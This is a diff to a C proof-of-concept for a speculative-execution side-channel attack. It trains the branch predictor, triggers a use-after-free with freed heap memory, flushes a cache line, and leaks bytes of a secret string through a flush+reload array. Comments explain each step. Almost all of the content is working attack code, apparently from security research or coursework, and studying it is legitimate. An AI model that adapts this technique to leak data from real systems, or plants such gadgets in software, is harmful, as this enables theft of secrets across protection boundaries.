@@ -28,56 +28,64 @@ extern inline void attack_func(int secret_index) {
 
 /*
  * Variables required in cache:
- *
- *
+ * i
+ * SECRET
  *
  * Variables requried in mem:
  *  freed[0]
  */
-//training: free_index=1 print_index=0
+//training: free_index=2 print_index=0
 //attack:   free_index=0 print_index={iterate through string SECRET}
 void victim_func(int free_index, int secret_index) {
-    //M_MMAP_THRESHOLD;
-    int* i = calloc(1, MALLOC_SIZE);
-    int* j = calloc(1, MALLOC_SIZE);
+
+    //alloc 3 numbers. put addresses in array to prevent branches (fools branch predictor).
+    int  k_idx = 0;
+    int  l_idx = 1;
+    int  m_idx = 2;
+    int  n_alloced_numbers = 3;
     int* k = calloc(1, MALLOC_SIZE);
-    //printf("\ni address: %p\t", &i);
-    int* i_j_k_addresses[3];
-    i_j_k_addresses[0] = i;
-    i_j_k_addresses[1] = j;
-    i_j_k_addresses[2] = k;
+    int* l = calloc(1, MALLOC_SIZE);
+    int* m = calloc(1, MALLOC_SIZE);
+    int* klm_addresses[n_alloced_numbers];
+    klm_addresses[k_idx] = k;
+    klm_addresses[l_idx] = l;
+    klm_addresses[m_idx] = m;
 
-    char freed[3] __attribute__ ((aligned (256)));
-    for(int iter = 0; iter < 3; iter++) freed[iter] = false;  //all false
+    //array that tracks which numbers are freed. Default value is false.
+    char freed[n_alloced_numbers] __attribute__ ((aligned (256)));
+    for(int i = 0; i < n_alloced_numbers; i++) freed[i] = false;
 
-    int* i_j_k_address = i_j_k_addresses[free_index];
-    free(i_j_k_address);
+    //free either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
+    int* klm_address = klm_addresses[free_index];
+    free(klm_address);
     freed[free_index] = true;
 
-    int* i_dupe = malloc(MALLOC_SIZE);
-    *i_dupe = secret_index;
-    //END ATTACK FUNC
+    //Now that k,l or m has been freed. A new allocation of the same size most likely
+    //gets the address that was just freed. In the attack scenario, this is k.
+    //The attacker who controls k can now overwrite k as wel please.
+    int* k_dupe = malloc(MALLOC_SIZE);
+    *k_dupe = secret_index;
 
     printf("    \n");   //WHY DOES THIS IMPROVE ACCURACY?
 
-
+    //Remove freed[k_idx] from cache, so that the branch will speculatively execute.
     cpuid();
-    flush((void*)&freed[0]);
+    flush((void*)&freed[k_idx]);
     cpuid();
 
     if(!freed[0]) {
-        //volatile cp_t cp1 = flush_reload_arr[0];
-        volatile cp_t cp = flush_reload_arr[SECRET[*i]];
+        //Byte k (equals secret_index) is leaked into the flush+reload array.
+        volatile cp_t cp = flush_reload_arr[SECRET[*k]];
     }
 
     cpuid();
-    if(free_index==0) printf("i: %p (%d)\tj: %p\tk: %p\t", i, *i, j, k);
-    if(free_index==0) printf("dup%p:%d\ti_v:%d\n", i_dupe, *i_dupe, *i);
-    if(!freed[0]) free(i);
-    if(!freed[1]) free(j);
-    if(!freed[2]) free(k);
-    free(i_dupe);
 
+    //Optional debug print and freeing of allocated memory.
+    if(DBG && free_index==0) printf("k: %p (%d)\toverwrite_addr:%p (%d)\tnew val k: %d\n", k, *k, k_dupe, *k_dupe, *k);
+    if(!freed[0]) free(k);
+    if(!freed[1]) free(l);
+    if(!freed[2]) free(m);
+    free(k_dupe);
 }
 
 int* prepare(int secret_index) {
@@ -97,10 +105,6 @@ int* prepare(int secret_index) {
     secret_indices[n_accesses-1] = secret_index;
     cpuid();
 
-    //TEMP
-    //n_accesses = 0;
-    //victim_func(0, 0);
-    //TEMP
     for(int i = 0; i < n_accesses; i++) {
         //if(DBG) printf("%d:\tfree %d\tsecret %d\n", i, free_indices[i], secret_indices[i]);
         victim_func(free_indices[i], secret_indices[i]);
@@ -138,31 +142,3 @@ int main(int argc, char** argv) {
     free_results(results, REPETITIONS, SECRET_SIZE);
 
 }
-
-/*
-
-attack_func(int secret_index) {
-
-    int* i_dupe = malloc(sizeof(int));
-        *i_dupe = secret_index;
-}
-
-//training: free_index=1 print_index=0
-//attack:   free_index=0 print_index={iterate through string SECRET}
-victim_func(free_index, secret_index) {
-
-    int* i = malloc(sizeof(int));
-    int* j = malloc(sizeof(int));
-    int* k = malloc(sizeof(int));
-
-    if      (free_index == 0)	free(i); freed[0] = true;
-    else if (free_index == 1)	free(j); freed[1] = true;
-    else if (free_index == 2}	free(k); freed[2] = true;
-
-    if(!freed[0]) attack_func(secret_index);
-
-    cp_t cp = leak_array[SECRET[*i]];
-
-}
-
- */
